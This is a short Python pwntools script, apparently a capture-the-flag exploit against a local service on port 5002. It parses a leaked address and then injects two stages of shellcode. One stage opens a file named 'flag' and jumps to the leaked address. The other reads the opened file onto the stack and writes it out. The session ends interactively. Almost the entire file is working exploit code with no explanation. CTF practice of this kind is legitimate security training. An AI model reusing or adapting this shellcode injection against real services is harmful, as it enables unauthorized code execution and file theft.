from pwn import *
context.arch="amd64"
#elf=ELF("./task",checksec=False)
#p=process("./main")
#pause()
p=remote("localhost",5002)

p.recvuntil(b"-> ")

plate1=int(p.recvline().decode().strip(),16)

log.info(hex(plate1))


shellcode_two=asm(shellcraft.open("flag"))

#shellcode_two+=asm('ret '+str(hex(plate1)),os='linux')
shellcode_two+=asm("mov rdi, "+str(hex(plate1))+";call rdi",arch="amd64")

#print(hex(len(shellcode_two)))

#print(disasm(shellcode_two))

shellcode_one=asm(shellcraft.read('rax','rsp',200))

shellcode_one+=asm(shellcraft.write(1,'rsp',200))

#log.info("------------")

#print(hex(len(shellcode_one)))

#print(disasm(shellcode_one))


#log.info(f"shell_code_1={shellcode_one}")
print(hex(len(shellcode_one)))
print(hex(len(shellcode_two)))
p.sendline(shellcode_one)

sleep(1)

p.sendline(shellcode_two)

p.interactive()
